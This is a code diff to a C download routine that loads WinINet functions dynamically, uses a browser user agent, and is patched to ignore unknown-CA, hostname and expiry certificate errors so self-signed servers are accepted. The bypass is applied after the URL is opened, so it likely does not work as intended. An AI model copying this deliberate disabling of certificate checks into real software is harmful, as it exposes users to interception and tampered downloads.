@@ -115,28 +115,35 @@ static int download_file(const char* url, const wchar_t* dest) {
     typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
     typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
     typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
+    typedef BOOL (WINAPI *pInternetSetOptionA)(HINTERNET, DWORD, LPVOID, DWORD);
 
     pInternetOpenA InternetOpenA = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
     pInternetOpenUrlA InternetOpenUrlA = (pInternetOpenUrlA)GetProcAddress(hWinInet, "InternetOpenUrlA");
     pInternetReadFile InternetReadFile = (pInternetReadFile)GetProcAddress(hWinInet, "InternetReadFile");
     pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)GetProcAddress(hWinInet, "InternetCloseHandle");
+    pInternetSetOptionA InternetSetOptionA = (pInternetSetOptionA)GetProcAddress(hWinInet, "InternetSetOptionA");
 
     if (!InternetOpenA || !InternetOpenUrlA || !InternetReadFile || !InternetCloseHandle) {
-        FreeLibrary(hWinInet);
-        return 0;
+        FreeLibrary(hWinInet); return 0;
     }
 
     HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) { FreeLibrary(hWinInet); return 0; }
 
-    // INTERNET_FLAG_IGNORE_UNKNOWN_CA bypasses the self-signed cert error
-    DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_UNKNOWN_CA;
+    // Valid flags for InternetOpenUrlA to ignore CN and Date
+    DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
     
     HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, dwFlags, 0);
     if (!hUrl) {
         InternetCloseHandle(hInternet);
         FreeLibrary(hWinInet);
         return 0;
+    }
+
+    // Use InternetSetOptionA to force ignore UNKNOWN_CA (Self-Signed certs)
+    if (InternetSetOptionA) {
+        DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+        InternetSetOptionA(hUrl, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
     }
 
     HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
